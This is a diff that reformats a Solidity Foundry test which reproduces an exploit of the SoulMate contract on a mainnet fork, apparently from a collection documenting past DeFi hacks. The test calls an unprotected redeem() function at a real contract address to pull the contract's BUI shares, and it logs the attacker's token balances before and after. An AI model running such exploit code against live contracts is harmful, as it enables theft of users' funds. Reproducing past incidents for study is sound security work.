@@ -14,10 +14,13 @@ import "../interface.sol";
 // https://twitter.com/MetaSec_xyz/status/1749743245599617282
 
 interface ISoulMateContract {
+
     function redeem(uint256 _shares, address _receiver) external;
+
 }
 
 contract ContractTest is Test {
+
     ISoulMateContract private constant SoulMateContract = ISoulMateContract(0x82C063AFEFB226859aBd427Ae40167cB77174b68);
     IERC20 private constant BUI = IERC20(0xb7470Fd67e997b73f55F85A6AF0DeB2c96194885);
     IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
@@ -29,7 +32,7 @@ contract ContractTest is Test {
     IERC20 private constant UNI = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 19063676);
+        vm.createSelectFork("mainnet", 19_063_676);
         vm.label(address(SoulMateContract), "SoulMateContract");
         vm.label(address(BUI), "BUI");
         vm.label(address(USDC), "USDC");
@@ -43,62 +46,35 @@ contract ContractTest is Test {
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "Exploiter USDC balance before attack",
-            USDC.balanceOf(address(this)),
-            USDC.decimals()
+            "Exploiter USDC balance before attack", USDC.balanceOf(address(this)), USDC.decimals()
+        );
+        emit log_named_decimal_uint("Exploiter DAI balance before attack", DAI.balanceOf(address(this)), DAI.decimals());
+        emit log_named_decimal_uint(
+            "Exploiter MATIC balance before attack", MATIC.balanceOf(address(this)), MATIC.decimals()
         );
         emit log_named_decimal_uint(
-            "Exploiter DAI balance before attack",
-            DAI.balanceOf(address(this)),
-            DAI.decimals()
+            "Exploiter AAVE balance before attack", AAVE.balanceOf(address(this)), AAVE.decimals()
         );
-        emit log_named_decimal_uint(
-            "Exploiter MATIC balance before attack",
-            MATIC.balanceOf(address(this)),
-            MATIC.decimals()
-        );
-        emit log_named_decimal_uint(
-            "Exploiter AAVE balance before attack",
-            AAVE.balanceOf(address(this)),
-            AAVE.decimals()
-        );
-        emit log_named_decimal_uint(
-            "Exploiter ENS balance before attack",
-            ENS.balanceOf(address(this)),
-            ENS.decimals()
-        );
-        emit log_named_decimal_uint(
-            "Exploiter ZRX balance before attack",
-            ZRX.balanceOf(address(this)),
-            ZRX.decimals()
-        );
-        emit log_named_decimal_uint(
-            "Exploiter UNI balance before attack",
-            UNI.balanceOf(address(this)),
-            UNI.decimals()
-        );
+        emit log_named_decimal_uint("Exploiter ENS balance before attack", ENS.balanceOf(address(this)), ENS.decimals());
+        emit log_named_decimal_uint("Exploiter ZRX balance before attack", ZRX.balanceOf(address(this)), ZRX.decimals());
+        emit log_named_decimal_uint("Exploiter UNI balance before attack", UNI.balanceOf(address(this)), UNI.decimals());
 
         // No access control
         SoulMateContract.redeem(BUI.balanceOf(address(SoulMateContract)), address(this));
 
         emit log_named_decimal_uint(
-            "Exploiter USDC balance after attack",
-            USDC.balanceOf(address(this)),
-            USDC.decimals()
+            "Exploiter USDC balance after attack", USDC.balanceOf(address(this)), USDC.decimals()
         );
         emit log_named_decimal_uint("Exploiter DAI balance after attack", DAI.balanceOf(address(this)), DAI.decimals());
         emit log_named_decimal_uint(
-            "Exploiter MATIC balance after attack",
-            MATIC.balanceOf(address(this)),
-            MATIC.decimals()
+            "Exploiter MATIC balance after attack", MATIC.balanceOf(address(this)), MATIC.decimals()
         );
         emit log_named_decimal_uint(
-            "Exploiter AAVE balance after attack",
-            AAVE.balanceOf(address(this)),
-            AAVE.decimals()
+            "Exploiter AAVE balance after attack", AAVE.balanceOf(address(this)), AAVE.decimals()
         );
         emit log_named_decimal_uint("Exploiter ENS balance after attack", ENS.balanceOf(address(this)), ENS.decimals());
         emit log_named_decimal_uint("Exploiter ZRX balance after attack", ZRX.balanceOf(address(this)), ZRX.decimals());
         emit log_named_decimal_uint("Exploiter UNI balance after attack", UNI.balanceOf(address(this)), UNI.decimals());
     }
+
 }
